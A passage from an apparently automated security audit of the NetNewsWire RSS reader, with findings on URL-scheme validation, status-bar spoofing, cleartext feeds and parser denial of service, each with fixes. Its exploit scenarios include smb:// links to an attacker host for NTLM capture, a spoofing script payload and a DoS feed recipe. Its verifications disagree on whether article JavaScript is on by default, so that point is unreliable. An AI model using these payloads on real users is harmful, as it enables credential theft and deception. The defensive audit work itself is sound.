**Summary**: The attack chain is fully reachable. An attacker-controlled RSS article body injects `nnwImageIcon://` img tags → scheme handler fires with no origin check → JS `onload`/`onerror` distinguishes hit/miss → `fetch()` exfiltrates to attacker's server. JavaScript is on by default. No defence closes this path.

### 35. [MEDIUM] Article link from feed content opened without URL scheme validation
**Class:** CWE-601: URL Redirection to Untrusted Site (Open Redirect)
**CWE:** CWE-601: URL Redirection to Untrusted Site (Open Redirect) - https://cwe.mitre.org/data/definitions/601.html
**File:** `Mac/MainWindow/Timeline/TimelineViewController+ContextualMenus.swift:95-101`
**CVSS 3.1:** **4.7** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)
**Also at:** `Mac/MainWindow/Sidebar/SidebarViewController.swift:298-315`, `Mac/MainWindow/MainWindowController.swift:1003-1005`

*2 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
In menu(for:) at line 183-192, articles.first!.preferredLink (fully attacker-controlled feed content) is used as the representedObject for the 'Open in Browser' menu item. When the user selects that item, openInBrowserFromContextualMenu (line 95-101) retrieves the string and passes it directly to Browser.open(urlString, inBackground: false) without any scheme allow-list check. The identical URL string is also written to the clipboard via copyURLFromContextualMenu (line 103-108). No sanitization occurs between feed parsing and either sink.

#### Impact
A malicious article in any subscribed feed can carry a non-HTTP URI as its link. When the victim selects 'Open in Browser' from the contextual menu, the URI is dispatched unvalidated through Browser.open(), enabling the same class of scheme-confusion attacks (SMB hash capture, custom-scheme invocation) described above.

#### Exploit scenario
Attacker publishes a feed item whose <link> is 'smb://attacker.example.com/share'. Victim right-clicks the article in the timeline and selects 'Open in Browser'. Browser.open dispatches the smb:// URI; macOS connects and potentially leaks NTLM credentials. Alternatively 'vnc://attacker.example.com/' opens a VNC session displaying attacker-controlled graphics, or an installed-app deep-link (e.g., 'x-apple-remote-desktop://') triggers privileged operations.

#### Preconditions
- Attacker can publish or modify a feed that the victim subscribes to
- Victim right-clicks the article and explicitly selects 'Open in Browser' from the contextual menu

```
@objc func openInBrowserFromContextualMenu(_ sender: Any?) {
    guard let menuItem = sender as? NSMenuItem, let urlString = menuItem.representedObject as? String else {
        return
    }
    // urlString is article.preferredLink — attacker-controlled, no scheme check
    Browser.open(urlString, inBackground: false)
}
```

#### How to fix
In the helper that passes a link to Browser.open, validate the URL scheme against an explicit allow-list (['http', 'https']) before calling Browser.open. Apply the same check for copyURLFromContextualMenu so that non-HTTP URIs are never silently placed on the clipboard as URL types.

**Exploitability:** Right-click context menu opens the article link (fully feed-controlled) via Browser.open() without scheme validation. A javascript: or custom-scheme URI in the RSS <link> field executes when the user selects 'Open in Browser'. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:L). Requires user right-click action on the specific article.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Unvalidated feed-content URL scheme flows through Browser.open's fallback path to a bare NSWorkspace.shared.open(), dispatching arbitrary schemes (smb://, vnc://, deep links) to their OS-registered handlers; the requiresUniversalLinks guard is explicitly bypassed by the error-handler fallback for any non-http/https URL.

I now have the complete call chain. Let me synthesize the findings:

**Analysis**

**A. What the code actually does (lines 95-101 + 183-192)**
Confirmed: `articles.first!.preferredLink` → `openInBrowserMenuItem(link)` → `menuItem.representedObject = link` → `Browser.open(urlString, inBackground: false)`.

**B. Full data flow — source to sink**

1. **`rawLink`** (Article.swift:23,40) — stored verbatim from feed parsing, no scheme filtering.
2. **`link`** (ArticleUtilities.swift:55-59) — returns `url?.absoluteString ?? rawLink`, where `url = URL.encodeSpacesIfNeeded(rawLink)` adds only space-percent-encoding.
3. **`preferredLink`** (ArticleUtilities.swift:73-81) — returns `link` or `externalLink`; no scheme check.
4. **`Browser.open`** (Browser.swift:46-68):
   - `URL(string: urlString)` — succeeds for any syntactically valid URL including `smb://`, `vnc://`, etc.
   - `preparedForOpeningInBrowser()` (URL+RSWeb.swift:60-67) — only replaces spaces/`^`/`&amp;`; **no scheme allowlist**.
   - First attempt: `NSWorkspace.shared.open(preparedURL, configuration:)` with **`requiresUniversalLinks = true`** — this FAILS for `smb://`/`vnc://`/custom deep links (not universal links) and fires the error handler.
   - **Error handler fallback** → `MacWebBrowser.openURL(url, inBackground:)` (MacWebBrowser.swift:16-32) → `NSWorkspace.shared.open(preparedURL)` **without** `requiresUniversalLinks`.

**C. Is there a defence?**

- The `requiresUniversalLinks = true` looks like a restriction, but the explicit error-handler fallback on lines 57-65 of Browser.swift calls `MacWebBrowser.openURL` which ends with a bare `NSWorkspace.shared.open(preparedURL)` — no scheme restriction, dispatches to the OS-registered handler for any scheme.
- `preparedForOpeningInBrowser()` does cosmetic encoding only — no allowlist.
- No upstream scheme filtering anywhere between RSParser and the sink.

**D. Probing the edge cases**

The fallback path is not a defensive measure — it was designed to handle the case where no universal link app is registered. For `smb://`, `vnc://`, `x-apple-remote-desktop://`, etc., `requiresUniversalLinks` always fails, always triggering the fallback, always reaching the unrestricted `NSWorkspace.open`. The defence-looking flag is fully bypassed for precisely the non-http/https schemes that matter.

---

**Exploitation requires:**
- Attacker controls a feed item's `<link>` element (fully attacker-controlled from network)
- Victim right-clicks and explicitly selects "Open in Browser" (UI:R)

**Confirmed impact:** `smb://attacker/share` → macOS auto-authenticates with NTLM to the attacker's host; `vnc://attacker/` → Screen Sharing opens attacker-controlled VNC. Both cross from NetNewsWire into OS-level subsystems (S:C).

---

### 36. [MEDIUM] Static openURL uses raw URL ignoring preparedForOpeningInBrowser in background path
**Class:** CWE-20: Improper Input Validation
**CWE:** CWE-20: Improper Input Validation - https://cwe.mitre.org/data/definitions/20.html
**File:** `Modules/RSWeb/Sources/RSWeb/MacWebBrowser.swift:16-31`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
In the static MacWebBrowser.openURL(_:inBackground:) function the guard on line 18 correctly calls url.preparedForOpeningInBrowser() and binds the result to preparedURL, returning false if the preparation step fails. However, the inBackground branch on line 26 passes the original url argument directly to NSWorkspace.shared.open(_:configuration:completionHandler:), not preparedURL. Only the foreground path on line 31 uses the prepared value. The instance method (line 184-202) does not have this defect — it correctly uses preparedURL in both paths. The consequence is that any URL transformation performed by preparedForOpeningInBrowser() (credential stripping, scheme canonicalisation, normalisation) is entirely bypassed whenever a caller opens a URL in background mode through the static method, which is the common case for an RSS reader's 'Open in Background Tab' feature.

#### Impact
The background-open code path sends the original, unmodified URL to NSWorkspace instead of the sanitized preparedURL. Whatever URL normalization or credential-stripping preparedForOpeningInBrowser() performs is silently skipped, so a maliciously crafted URL (e.g., containing embedded HTTP Basic-Auth credentials like https://user:[REDACTED-URL-CRED]@evil.com/ or a scheme other than http/https that the preparation function would otherwise suppress) reaches the OS shell via NSWorkspace unfiltered. An attacker who controls feed content can place such a URL in an article link and have it opened in background without the app's URL preparation logic applying.

#### Exploit scenario
An attacker publishes a malicious RSS feed containing an article whose link URL is https://attacker:[REDACTED-URL-CRED]@tracking.example.com/path. The user subscribes to this feed and uses NetNewsWire's 'Open in Background' action (which calls the static MacWebBrowser.openURL with inBackground: true). preparedForOpeningInBrowser() would normally strip the embedded credentials before handing the URL to the OS, producing https://tracking.example.com/path; but because the guard result (preparedURL) is discarded in the background path, NSWorkspace.open receives the raw URL with credentials intact, sending them to the browser where they appear in history and are transmitted to the remote host as HTTP Basic Auth headers.

#### Preconditions
- Attacker controls or can inject content into at least one RSS/Atom feed the user has subscribed to, allowing a crafted article link URL to be delivered.
- User invokes the 'Open in Background' action (the default for open-all-unread workflows), triggering the static openURL with inBackground: true.
- preparedForOpeningInBrowser() performs a URL transformation (credential stripping, scheme conversion) that is security-relevant; if it only returns nil for dangerous schemes the guard mitigates the worst cases, but non-nil modifications are still bypassed.

```
guard let preparedURL = url.preparedForOpeningInBrowser() else {
    return false
}

if inBackground {
    let configuration = NSWorkspace.OpenConfiguration()
    configuration.activates = false
    NSWorkspace.shared.open(url, configuration: configuration, completionHandler: nil) // BUG: should be preparedURL
    return true
}

return NSWorkspace.shared.open(preparedURL)
```

#### How to fix
Change line 26 to open preparedURL, not the raw url, exactly as the foreground path on line 31 does. Replace `NSWorkspace.shared.open(url, configuration: configuration, completionHandler: nil)` with `NSWorkspace.shared.open(preparedURL, configuration: configuration, completionHandler: nil)`. This ensures the inBackground path receives the same sanitised URL that the foreground path would use.

**Exploitability:** MacWebBrowser.openURL static method passes the raw url (not preparedURL) to NSWorkspace in the inBackground branch, bypassing URL sanitization including credential stripping and scheme canonicalization. Feed-derived URLs with embedded user:password@ authority components opened in background tabs retain credentials in the browser history. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — bug confirmed at line 26 (`url` instead of `preparedURL` in inBackground branch); external entry point via RSS article links through the Browser.open fallback path; however the scanner's credential-stripping exploit is wrong — preparedForOpeningInBrowser() only does minor normalization (space/%5E encoding, &amp; decoding), not credential stripping, so actual severity is low

I now have enough information to form a complete verdict. Let me synthesize the findings:

---

**Analysis**

**A. Code Confirmation (lines 16–32)**
The bug is **confirmed exactly as described**. Line 26 reads:
```swift
NSWorkspace.shared.open(url, configuration: configuration, completionHandler: nil)
```
It should read `preparedURL`. The foreground path on line 31 correctly uses `preparedURL`. The instance method (line 199) is also correct. This is a plain wrong-variable bug.

**B. Call Chain**
The primary path to this code in production is `Browser.open(_:inBackground:)` at `Mac/Browser.swift:46–68`:
1. `Browser.open` constructs `preparedURL` and calls `NSWorkspace.shared.open(preparedURL, configuration:)` with **`requiresUniversalLinks: true`**.
2. For typical `https://` article URLs with no registered Universal Link handler, this **always fails** and the error block runs.
3. The error block invokes `MacWebBrowser.openURL(url, inBackground: inBackground)` (line 64) — passing the raw `url`, not `preparedURL`.
4. Inside the static method the guard binds `preparedURL`, but the `inBackground` branch at line 26 throws that result away and opens the raw `url`.

This path is reached by `Timeline/TimelineViewController.swift:393` and `MainWindowController.swift:360/381` which are externally-triggered by user action on RSS article links — attacker-controllable URLs.

**C. What `preparedForOpeningInBrowser()` Actually Does**
The scanner's claimed exploit (credential stripping) is **wrong**. Reading `URL+RSWeb.swift:60–67`, the function only:
- Replaces literal spaces → `%20`
- Replaces `^` → `%5E`
- Decodes `&amp;` → `&`
- Decodes `&#38;` → `&`

It does **not** strip `user:password@host` credentials; those are passed through unchanged regardless. The credential-stripping exploit scenario is not supported by the code.

**D. Actual Security Impact of the Bypass**
- **Spaces / `^`**: In practice, a `URL` object in Swift created via `URL(string:)` from a string with literal spaces returns `nil`, so URLs with spaces won't normally exist as `URL` objects. Low impact.
- **HTML entity decoding** (`&amp;` → `&`): An RSS/Atom feed URL such as `https://example.com?a=1&amp;b=2` might arrive pre-decoded by the XML parser (which already interprets `&amp;` → `&`). If it arrives as `&amp;` in the `URL` object, the background path sends the URL with literal `&amp;` to the browser, which interprets `&amp;` as a query value not a separator — meaning a subtly different resource is fetched. This is a real but narrow normalization bypass.

No credential exposure, no auth bypass, no code execution results from this bypass. The impact is inconsistent URL normalization between foreground and background modes.

---

**The bug is real. The external entry point is real. The security impact is real but minor — the scanner's exploit scenario is inaccurate (credential stripping doesn't happen), but the normalization bypass is confirmed.**

### 37. [MEDIUM] Default feed fetched over cleartext HTTP enabling MitM injection
**Class:** CWE-319: Cleartext Transmission of Sensitive Information
**CWE:** CWE-319: Cleartext Transmission of Sensitive Information - https://cwe.mitre.org/data/definitions/319.html
**File:** `Shared/Importers/DefaultFeeds.opml:15-15`
**CVSS 3.1:** **4.2** (Medium) — `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:A (non-network)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The `xmlUrl` for the 'Scripting News' entry is `http://scripting.com/rss.xml` (plain HTTP). This URL is embedded in a bundled OPML file that is imported on first launch to populate the user's default feed list. When NetNewsWire's refresh path (`LocalAccountRefresher.refresh(_:)`) fetches this feed it uses the stored `xmlUrl` verbatim. Because the scheme is `http://`, the TCP stream is unencrypted and unauthenticated. There is no TLS handshake for an attacker to break or bypass; the content is simply readable and writable on the wire. The `htmlUrl` for the same entry (`http://scripting.com/`) is also plain HTTP, meaning any link-open action for this feed also bypasses TLS. All other nine default feeds use `https://` URLs.

#### Impact
A network-adjacent attacker (coffee-shop Wi-Fi, rogue AP, ISP) can intercept the unencrypted RSS fetch and return crafted feed content to every new NetNewsWire user who retains the default feed list. Injected articles are parsed by RSParser and rendered in the article WebView, giving the attacker a reliable content-injection primitive against a first-run user base.

#### Exploit scenario
An attacker performs ARP-cache poisoning on a public Wi-Fi network. When NetNewsWire refreshes its feeds, the `http://scripting.com/rss.xml` fetch is directed to the attacker's transparent proxy. The proxy returns a valid RSS envelope whose `<description>` elements contain injected HTML (e.g., hidden `<iframe>` links to phishing pages or `<script>` tags, depending on WebView JS policy). The injected articles appear indistinguishably in the timeline alongside legitimate content. Because this is a default feed, every new user on that network is affected without any interaction beyond opening the app.

#### Preconditions
- Attacker must occupy a network-adjacent MitM position (same LAN, rogue AP, or malicious upstream router) at the time the feed refresh occurs.
- User must be running a fresh NetNewsWire install that still has the default Scripting News feed (or have manually re-added it by that URL).

```
<outline text="Scripting News" title="Scripting News" type="rss" version="RSS" htmlUrl="http://scripting.com/" xmlUrl="http://scripting.com/rss.xml"/>
```

#### How to fix
Change the `xmlUrl` and `htmlUrl` for Scripting News on line 15 to their HTTPS equivalents (`https://scripting.com/rss.xml` and `https://scripting.com/`). Additionally, consider adding a startup validation pass that rejects or warns about any `http://` feed URLs imported from this bundled OPML, and enforce HTTPS-only fetching at the `LocalAccountRefresher` / RSWeb networking layer as a defense-in-depth measure.

**Exploitability:** The bundled default 'Scripting News' feed uses an http:// URL fetched without TLS on every refresh. An adjacent-network attacker can inject malicious article content into this feed without breaking any cryptographic protection. CVSS 4.2 (AV:A/AC:H). Blast radius limited to the single default feed; ACS disabled (finding 2) removes the last client-side guard.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — HTTP URL confirmed; ATS globally disabled; no scheme upgrade anywhere in the import→store→fetch pipeline; article body rendered unsanitised in WKWebView; network-adjacent MitM is a realistic precondition (rogue AP / ARP poisoning on public Wi-Fi).

I now have enough information to render a verdict. Let me summarize what I found across all four investigation steps.

---

**Investigation Summary**

**A. File Verification**
Line 15 of `Shared/Importers/DefaultFeeds.opml` is exactly as the scanner reported:
```xml
<outline text="Scripting News" … xmlUrl="http://scripting.com/rss.xml"/>
```
All 9 other default feeds use `https://`. The HTTP URL is real.

**B. Call-chain to external entry point**
1. **First launch** → `DefaultFeedsImporter.importDefaultFeeds(account:)` imports the OPML and stores the URL verbatim in the account.
2. **Every scheduled refresh** → `LocalAccountRefresher.refreshFeeds(_:)` calls `Self.url(for:)` which does `URL(string: feed.url)` (line 600) — no scheme upgrade — and feeds it to `downloadSession.download(Set(urls))`.
3. The `DownloadSession` uses a plain `URLSession` with `URLSessionConfiguration.ephemeral`.
4. **ATS is globally disabled**: both `iOS/Resources/Info.plist` (line 67) and `Mac/Resources/Info.plist` (line 58) set `NSAllowsArbitraryLoads = true`, so iOS/macOS will not upgrade or block the plaintext request.

External entry point confirmed: any network-adjacent actor who can intercept the TCP stream to `scripting.com:80` at refresh time can substitute the response.

**C. Looking for defences**
| Defence candidate | Finding |
|---|---|
| ATS / HTTPS enforcement | **Absent** — `NSAllowsArbitraryLoads true` on both platforms |
| URL upgrading on import | **Absent** — `DefaultFeedsImporter` calls `importOPML` directly with no normalisation |
| URL upgrading at fetch time | **Absent** — `LocalAccountRefresher.url(for:)` returns `URL(string: feed.url)` verbatim |
| HTML sanitisation of article body | **Absent** — `ArticleRenderer` sets `self.body = article?.body ?? ""` (line 117) and inserts it directly into the WKWebView template as `d["body"] = body` |
| Title sanitisation | Present (`ArticleStringFormatter.sanitizedTitle`) but body is a separate, unsanitised field |
| JavaScript disabled by default | **Yes** — `UserDefaults.standard.bool(forKey:)` returns `false` by default, so `allowsContentJavaScript = false` at first launch |
| WKWebView process isolation | Present, but does not prevent HTML/CSS injection or external resource loads |

**D. Probe the one defence found (JS off by default)**
JavaScript is off by default, which limits script execution, but the body is rendered as raw HTML so an attacker can still inject:
- `<a>` tags silently redirecting clicks to phishing pages
- `<img>` / `<iframe>` tags loading attacker-controlled resources (revealing the user's IP, enabling phishing UI)
- `<form>` elements POSTing to attacker infrastructure
- CSS-only content overlays

Furthermore, any user who has enabled JavaScript (it is a user-accessible toggle in Settings) would be fully vulnerable to injected `<script>` execution in the article WebView.

---

### 38. [MEDIUM] Attacker-Controlled Text Injected into Status Bar via WKScript Message
**Class:** CWE-451
**CWE:** CWE-451 - https://cwe.mitre.org/data/definitions/451.html
**File:** `Mac/MainWindow/Detail/DetailStatusBarView.swift:67-73`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
The data flow is: (1) main_mac.js line 11 reads closestAnchor.href—a value sourced from untrusted RSS article HTML—and posts it to the native 'mouseDidEnter' WKScriptMessageHandler. (2) The handler (DetailWebViewController::userContentController(_:didReceive:), an explicit untrusted entry point) forwards the raw string to DetailViewController.mouseDidEnter(_:link:) which unconditionally assigns it to statusBarView.mouseoverLink. (3) updateLinkForDisplay() (lines 67-73) applies only strippingHTTPOrHTTPSScheme, which trims 'http://' or 'https://' prefixes but performs no scheme allowlist validation, no URL syntax check, and no content sanitization before assigning the result to urlLabel.stringValue (line 26). When article-content JavaScript is enabled (controlled by AppDefaults.shared.isArticleContentJavascriptEnabled, visible in DetailViewController line 64), malicious article JavaScript can call window.webkit.messageHandlers.mouseDidEnter.postMessage(arbitraryString) directly—bypassing any hover gesture—to display attacker-chosen text in the status bar. Even without JavaScript, links using non-http/https schemes (file://, data:, javascript:, custom) are shown verbatim because strippingHTTPOrHTTPSScheme does not strip those schemes.

#### Impact
An RSS feed author can populate the status-bar URL display with arbitrary attacker-chosen text. When article-content JavaScript is enabled, malicious scripts bypass the hover requirement entirely and push any string into the status bar, enabling targeted phishing deception against the user (e.g., falsely showing a trusted bank URL while a malicious link is visible elsewhere).

#### Exploit scenario
Attacker publishes an RSS feed whose article body contains: <script>window.webkit.messageHandlers.mouseDidEnter.postMessage('https://your-bank.com/login — Verified Secure ✓');</script>. Any subscriber with article-content JavaScript enabled who opens this article immediately sees 'your-bank.com/login — Verified Secure ✓' in the status bar with no hover needed. The user, trusting the status bar display, is primed to click a phishing link styled to look like a login button. Separately, even with JavaScript disabled, a link with href='file:///Users/victim/Documents/passwords.txt' causes the status bar to display that local path on hover, revealing filesystem layout.

#### Preconditions
- User is subscribed to a malicious RSS feed and opens an article from it
- For arbitrary-text injection without hover: User has enabled article-content JavaScript (AppDefaults.shared.isArticleContentJavascriptEnabled)

```
func updateLinkForDisplay() {
    if let mouseoverLink = mouseoverLink, !mouseoverLink.isEmpty {
        linkForDisplay = mouseoverLink.strippingHTTPOrHTTPSScheme  // only strips http/https; any other scheme or arbitrary string passes through
    } else {
        linkForDisplay = nil
    }
}
```

#### How to fix
In updateLinkForDisplay() (DetailStatusBarView.swift:67-73), validate that mouseoverLink is a well-formed http or https URL (e.g., using URL(string:) and checking scheme == 'http' || scheme == 'https') before assigning to linkForDisplay; suppress display entirely for any other value. Additionally, in the WKScriptMessageHandler implementation for 'mouseDidEnter', validate the received WKScriptMessage.body is a String containing only a valid http/https URL before forwarding to the delegate, rejecting all other payloads at the entry point.

**Exploitability:** mouseDidEnter WKScript message sets the macOS status bar label from the href attribute of any article link, with only http/https prefix stripping (not a scheme allowlist). When article JS is enabled, arbitrary JS can call window.webkit.messageHandlers.mouseDidEnter.postMessage(anyString) to display misleading text. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L). UI deception primitive; no code execution.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — article-content JavaScript is enabled by default (Mac AppDefaults.swift line 347); untrusted RSS article JS can call `window.webkit.messageHandlers.mouseDidEnter.postMessage(arbitraryString)` and inject arbitrary text into the status bar with no validation in the handler chain, enabling phishing-grade status-bar spoofing without any user hover.

Now I have all the data I need to render a verdict. Let me trace the complete picture:

**A. The Sink (lines 67–73, confirmed)**
`updateLinkForDisplay()` strips only `http://`/`https://` prefixes via `strippingHTTPOrHTTPSScheme` — any other scheme or arbitrary string passes straight to `urlLabel.stringValue`.

**B. The call chain (confirmed)**
1. `main_mac.js` (injected as a `WKUserScript`) posts `closestAnchor.href` via `window.webkit.messageHandlers.mouseDidEnter.postMessage(...)`.
2. **But** when content JavaScript is enabled, *any article-page JS* can call `window.webkit.messageHandlers.mouseDidEnter.postMessage(arbitraryString)` directly — no hover required.
3. `DetailWebViewController.userContentController(_:didReceive:)` (line 185) receives the message and passes the raw string to `delegate?.mouseDidEnter(self, link:)`.
4. `DetailViewController.mouseDidEnter(_:link:)` (line 124) does one guard (non-empty & active controller), then assigns directly to `statusBarView.mouseoverLink`.
5. No validation, allow-listing, or URL-parsing anywhere in this chain.

**C. Key defence check — default JS state**
`Mac/AppDefaults.swift` line 347: `Key.articleContentJavascriptEnabled: true` is registered as the default. So **article-content JavaScript is ON for all fresh installs**. The `WKWebpagePreferences.allowsContentJavaScript` is set from this default at configuration time, meaning any article from any RSS feed can fire the handler with an arbitrary payload.

**D. Can the defence be bypassed?**
The only guard in `DetailViewController.mouseDidEnter` is `!link.isEmpty`. No URL parsing, no scheme check, no trusted-origin check on the WKScript message. The `webpagePreferences` is a computed property that reads the pref at webview-creation time; once JS is on (the default), every article loaded until the user explicitly opts out can abuse this channel. There are no auth gates — any RSS feed subscriber is exposed.

**Verdict reasoning:**
- External entry point: ✅ RSS article HTML → WKWebView with content JS on by default  
- No upstream control: ✅ No validation anywhere in the handler chain  
- Real impact: ✅ Attacker can display arbitrary text in the status bar without user hover — a genuine status-bar spoofing / phishing facilitation vector  
- The `file://` scheme sub-claim is weaker (attacker writes the path, reveals nothing about the victim's FS), but the JS injection path is real and default-enabled

### 39. [MEDIUM] O(n²) element-stack linear scan enables CPU-exhaustion DoS
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `Modules/RSParser/Sources/RSParser/XML/XMLSAXParser.swift:314-346`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.91 (1 run agreed)

#### Description
handleEnd() (line 314) searches elementStack.indices.reversed() to find the matching open element for each incoming end tag. When no match is found (orphan end tag), the scan traverses the entire stack before giving up. An attacker can construct a feed with N deeply nested open tags that stay on the stack (never closed), followed by N orphan closing tags with a different one-byte name. Each of the N orphan end tags triggers an O(N) scan, producing O(N²) total work. For N = 50,000 one-byte element names (<a>), the feed is only ~350 KB yet demands approximately 2.5 billion bytesEqual comparisons — well within typical download-size budgets (usually 1–5 MB).

#### Impact
A crafted feed containing many unclosed start tags followed by orphan end tags causes handleEnd to perform a full backwards scan of elementStack for each orphan tag that finds no match. A sub-500 KB feed can trigger billions of byte comparisons, locking the FeedParser serial dispatch queue for many minutes and rendering the app unresponsive to all refresh operations.

#### Exploit scenario
Attacker serves a 350 KB feed: <rss><channel> followed by 50,000 <a> start tags (all unclosed), then 50,000 </z> orphan end tags, then </channel></rss>. LocalAccountRefresher.refresh(_:) fetches it, FeedParser dispatches to RSSParser, and the SAX parse loop begins. Each </z> traverses all 50,000 elementStack entries (comparing one-byte slices) and finds no match. Total comparisons ≈ 2.5 × 10⁹. The FeedParser queue thread spins for hours, blocking all subsequent refresh operations until the app is force-quit.

#### Preconditions
- User must have subscribed to a feed URL controlled by the attacker
- Feed size must fit within the download size limit (the required payload is ~350 KB, typically well below limits)

```
var matchIndex: Int?
for i in elementStack.indices.reversed() {
    let entry = elementStack[i]
    if entry.namespace.prefix == incomingPrefix && bytesEqual(entry.localNameSlice, incomingLocal) {
        matchIndex = i
        break
    }
}
// If matchIndex is nil (orphan tag) the full O(depth) scan completed with no match.
```

#### How to fix
Cap elementStack depth: in handleStart(), reject or ignore start elements once elementStack.count exceeds a hard limit (e.g., 512 or 1024). This prevents both O(N) memory growth and the O(N²) scan. Alternatively, cap the total number of events processed per parse invocation and abort with a partial result if exceeded.

**Exploitability:** XMLSAXParser handleEnd() performs an O(N) stack scan for each orphan close tag, producing O(N²) total work for N unclosed elements followed by N mismatched close tags. A ~350 KB feed triggers ~2.5B comparisons, sustained CPU DoS. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). App may become unresponsive but process does not crash; eventual recovery when feed refresh completes.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — O(N²) element-stack scan confirmed in source; no depth cap, no parse timeout, no download size limit; reachable via attacker-controlled subscribed feed URL with no upstream defence

Based on my investigation:

**A — What the code actually does (lines 314–346):**
The code is exactly as the scanner described. `handleEnd` builds no early-exit shortcut before the loop: for every incoming end tag it scans `elementStack.indices.reversed()` to find a matching open element. If none is found (orphan end tag), the scan runs the entire stack depth and gives up at the `else` branch (line 336).

**B — Stack growth is unbounded:**
`handleStart` (line 215) unconditionally appends a `StackEntry` for every non-self-closing, non-passthrough element. No maximum depth check exists anywhere in `XMLSAXParser.swift` or its callers. The stack can grow to N for N unclosed start tags.

**C — Searching for defences:**
- No `maxDepth` / `depthLimit` / `stackLimit` anywhere in RSParser (confirmed via grep)
- No download size limit in RSWeb's `DownloadSession.swift` or anywhere in the Account module
- No parse timeout — the parse loop in `parse(_:)` (lines 68–96) runs until `.endOfDocument` with no deadline
- `bytesEqual` has a length fast-fail (`guard a.count == b.count`), but for equal-length names (`<a>` vs `</z>`, both 1 byte) the guard passes and the byte comparison proceeds — no relief for same-length one-byte names

**D — Probing the path:**
The external entry point is confirmed: `LocalAccountRefresher.refresh(_:)` fetches feeds over the network and hands the raw bytes to `FeedParser`/`RSSParser`, which ultimately calls `XMLSAXParser.parse()`. A user who subscribes to an attacker-controlled feed URL is fully exposed. The ~350 KB payload sits far below any practical download budget; no size check intervenes before parsing begins.

**Quantitative check:**
50,000 × `<a>` start tags → stack depth 50,000. 50,000 × `</z>` orphan end tags → each scans all 50,000 entries (length check passes for 1-byte names; byte differs on first char; returns false after one iteration per entry). Total inner-loop iterations ≈ 2.5 × 10⁹. The `StackEntry` array (50,000 entries) will overflow L2/L3 cache, making each iteration memory-bound (~100 ns) rather than compute-bound, which worsens wall-clock time.

**Conclusion:** The O(N²) scan is confirmed, has no mitigating control at any layer, is reachable from a user-subscribed feed URL (no auth gate in front of subscription), and will block the app's entire feed-refresh pipeline for an extended period.

### 40. [MEDIUM] Unbounded server-driven recursion causes memory exhaustion
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `Modules/Account/Sources/Account/ReaderAPI/ReaderAPICaller.swift:494-531`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.75 (1 run agreed)

#### Description
retrieveItemIDs(type:url:dateInfo:itemIDs:continuation:pageHandler:) at lines 494–531 is an unbounded tail-recursive async function. Each invocation appends server-supplied item IDs to the growing totalItemIDs array (line 529) and recursively calls itself when entries?.continuation is non-nil (line 531). There is no cap on total pages, total accumulated items, or async call depth. The continuation value is decoded directly from the remote server's JSON response (ReaderAPIReferenceWrapper, entries?.continuation). A second recursive path exists for zero-result pages (lines 521–522): if a page returns no itemRefs but still carries a continuation, the function loops forever with zero forward progress. The initial call is made unconditionally during account refresh (ReaderAPIAccountDelegate.refreshAll → caller.retrieveItemIDs(type: .allForAccount)), which itself is triggered by timers, background-refresh tasks, and foreground entry, all of which are reachable without any special user gesture beyond having a ReaderAPI account configured.

#### Impact
A malicious or compromised ReaderAPI server can return an infinite chain of continuation tokens, forcing the app to accumulate an unbounded [String] array in memory and issue unlimited network requests. On iOS the process is eventually killed by the OS for exceeding the memory limit; the refresh cycle never completes and user article-status updates are silently lost.

#### Exploit scenario
An attacker who operates (or compromises) a FreshRSS instance returns /reader/api/0/stream/items/ids responses that each contain 1,000 item IDs and a fresh, never-terminating continuation token. The app enters infinite async recursion, appending 1,000-entry slices to totalItemIDs on every iteration. On a 4 GB iOS device the process is killed after roughly 4 million items (~200 MB for the array alone, plus Swift runtime overhead and network buffers). Because the async function never returns, accountSettings.lastArticleFetchStartTime is never updated, so the next refresh starts from the same point and repeats the attack indefinitely.

#### Preconditions
- User has configured a ReaderAPI account (FreshRSS/generic, Inoreader, BazQux, or The Old Reader)
- The server that account points to returns continuation tokens indefinitely in its /stream/items/ids JSON responses

```
